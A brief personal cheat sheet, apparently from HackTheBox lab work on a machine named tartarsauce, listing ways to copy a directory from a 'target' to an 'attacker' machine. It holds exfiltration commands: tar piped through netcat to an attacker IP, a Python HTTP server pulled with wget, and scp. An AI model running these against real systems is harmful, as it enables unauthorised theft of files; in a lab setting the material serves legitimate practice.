# directory-with-nc

**Author:** Julien Bongars\
**Date:** 2026-02-07 02:44:25
**Path:**

---

## Create a dump file

```bash
# On Attacker machine 
nc -lvnp 5555 > dump.tar.gz

# On target
tar czf - /path/to/directory | nc 10.10.14.97 5555
```

## Create a simple HTTP server

```bash
# On Target machine
cd /path/to/directory
python -c 'import SimpleHTTPServer; SimpleHTTPServer.test()' 8080

# On Attacker machine
wget -r -np http://tartarsauce.htb:8080/
```

## Use scp to transfer the files

```bash
# On Attacker machine
scp -r /path/to/directory your-user@10.10.14.97:/tmp/
```
